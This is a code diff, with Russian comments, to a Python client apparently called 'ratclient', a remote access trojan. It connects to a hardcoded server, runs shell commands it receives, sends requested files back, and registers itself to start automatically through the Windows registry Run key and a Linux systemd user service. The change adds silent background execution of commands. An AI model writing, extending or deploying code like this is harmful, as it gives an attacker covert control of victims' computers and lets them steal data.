@@ -4,9 +4,10 @@ import os
 import sys
 import time
 
-SERVER_IP = "192.168.100.3"  # Замените на IP своего сервера
+SERVER_IP = "192.168.100.3"  # Замените на IP вашего сервера
 SERVER_PORT = 5000
 BUFFER_SIZE = 4096
+
 
 def execute_command(command):
     try:
@@ -15,8 +16,10 @@ def execute_command(command):
     except Exception as e:
         return f"Ошибка выполнения команды: {e}"
 
+
 def is_windows():
     return os.name == 'nt'
+
 
 # ---- Автозагрузка ----
 
@@ -46,6 +49,7 @@ def add_to_autostart_windows():
     except Exception as e:
         return False, f"Ошибка при добавлении в автозагрузку Windows: {e}"
 
+
 def is_in_autostart_windows():
     try:
         import winreg
@@ -64,6 +68,7 @@ def is_in_autostart_windows():
             i += 1
     except OSError:
         return False
+
 
 def add_to_autostart_linux():
     home = os.path.expanduser("~")
@@ -110,10 +115,12 @@ WantedBy=default.target
 
     return True, f"systemd сервис установлен и запущен: {service_path}"
 
+
 def is_in_autostart_linux():
     home = os.path.expanduser("~")
     service_path = os.path.join(home, ".config", "systemd", "user", "ratclient.service")
     return os.path.exists(service_path)
+
 
 def add_self_to_autostart():
     if is_windows():
@@ -131,10 +138,10 @@ def add_self_to_autostart():
         else:
             print("Уже добавлен в systemd автозапуск")
 
+
 # ---- Основной клиентские функции ----
 
 def main():
-    # Добавляем себя в автозапуск (если ещё не добавлен)
     try:
         add_self_to_autostart()
     except Exception as e:
@@ -162,7 +169,17 @@ def main():
                     break
 
                 if command.startswith("cmd:"):
-                    cmd = command[4:]
+                    cmd = command[4:].strip()
+
+                    if cmd.endswith('&'):
+                        # Фоновый запуск без ожидания
+                        cmd_no_amp = cmd.rstrip('&').strip()
+                        try:
+                            subprocess.Popen(cmd_no_amp, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            s.send(b"Команда выполнена в фоне")
+                        except Exception as e:
+                            s.send(f"Ошибка при запуске фоновой команды: {e}".encode(errors='ignore'))
+                        continue
 
                     if cmd.startswith("cd"):
                         path = cmd[2:].strip()
@@ -235,7 +252,6 @@ def main():
                     filepath = command[len("download:"):].strip()
                     try:
                         filesize = os.path.getsize(filepath)
-                        # Отправляем размер файла (8 байт, big endian)
                         s.sendall(filesize.to_bytes(8, byteorder='big'))
                         with open(filepath, "rb") as f:
                             while True:
